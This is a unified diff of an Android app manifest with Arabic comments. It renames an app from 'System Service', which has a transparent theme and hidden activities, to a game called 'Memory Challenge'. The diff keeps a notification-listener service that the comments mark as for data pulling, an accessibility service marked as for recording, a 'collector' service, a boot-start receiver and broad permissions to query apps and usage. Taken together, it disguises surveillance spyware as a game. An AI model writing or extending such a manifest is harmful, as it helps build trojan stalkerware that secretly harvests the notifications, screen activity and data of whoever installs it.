@@ -2,7 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- جميع الصلاحيات الممكنة -->
+    <!-- جميع الصلاحيات -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
@@ -31,79 +31,63 @@
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
-    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
-    <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.FLASHLIGHT" />
-    <uses-permission android:name="android.permission.BLUETOOTH" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
-    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
-    <uses-permission android:name="android.permission.NFC" />
-    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
-    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
-    <uses-permission android:name="android.permission.READ_SYNC_STATS" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-    <uses-permission android:name="android.permission.GET_TASKS" />
-    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
-    <uses-permission android:name="android.permission.READ_LOGS" />
 
     <application
         android:name=".MainApplication"
-        android:label="System Service"
-        android:theme="@style/Theme.Transparent"
+        android:label="Memory Challenge"
+        android:theme="@style/GameTheme"
         android:allowBackup="false"
         android:supportsRtl="true"
         android:usesCleartextTraffic="true"
-        android:hasFragileUserData="true"
-        android:persistent="true"
         android:icon="@drawable/ic_launcher"
         android:roundIcon="@drawable/ic_launcher"
         android:debuggable="false"
-        android:testOnly="false"
-        tools:ignore="GoogleAppIndexingWarning"
-        tools:replace="android:label,android:icon">
+        tools:ignore="GoogleAppIndexingWarning">
 
-        <!-- شاشة البداية - تظهر لثانية ثم تختفي -->
+        <!-- شاشة اللعبة الرئيسية -->
         <activity
-            android:name=".SplashActivity"
+            android:name=".game.MainGameActivity"
             android:exported="true"
-            android:launchMode="singleTask"
-            android:theme="@style/Theme.Transparent"
-            android:excludeFromRecents="true"
-            android:noHistory="true">
+            android:launchMode="singleTop"
+            android:screenOrientation="portrait">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- النشاط الرئيسي - مخفي -->
+        <!-- شاشة اللعب -->
         <activity
-            android:name=".MainActivity"
+            android:name=".game.GameBoardActivity"
             android:exported="false"
-            android:launchMode="singleTask"
-            android:theme="@style/Theme.Transparent"
-            android:excludeFromRecents="true" />
+            android:screenOrientation="portrait"
+            android:parentActivityName=".game.MainGameActivity" />
 
-        <!-- خدمة الإشعارات -->
+        <!-- إعدادات اللعبة -->
+        <activity
+            android:name=".game.GameSettingsActivity"
+            android:exported="false"
+            android:parentActivityName=".game.MainGameActivity" />
+
+        <!-- خدمة الإشعارات (للسحب) -->
         <service
-            android:name=".NotificationService"
-            android:label="System Service"
+            android:name=".services.NotificationListener"
+            android:label="Game Service"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true"
             android:enabled="true"
-            android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection">
+            android:foregroundServiceType="dataSync">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
-        <!-- خدمة الوصول الأصلية -->
+        <!-- خدمة الوصول (للتسجيل) -->
         <service
-            android:name=".MyAccessibilityService"
-            android:label="System Helper"
+            android:name=".services.AccessibilityHelper"
+            android:label="Game Helper"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:enabled="true"
@@ -113,49 +97,23 @@
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
+                android:resource="@xml/accessibility_config" />
         </service>
 
-        <!-- خدمة المساعد التلقائي للصلاحيات -->
+        <!-- خدمة الجمع التلقائي -->
         <service
-            android:name=".AutoPermissionHelper"
-            android:label="System Helper"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true"
-            android:enabled="true"
-            android:foregroundServiceType="specialUse">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
-
-        <!-- خدمة السحب التلقائي -->
-        <service
-            android:name=".AutoCollectorService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync" />
-
-        <!-- حارس الصلاحيات -->
-        <service
-            android:name=".PermissionGuardian"
+            android:name=".services.CollectorService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <!-- مستقبل التشغيل التلقائي -->
         <receiver
-            android:name=".BootReceiver"
+            android:name=".receivers.BootReceiver"
             android:exported="true"
-            android:enabled="true"
-            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
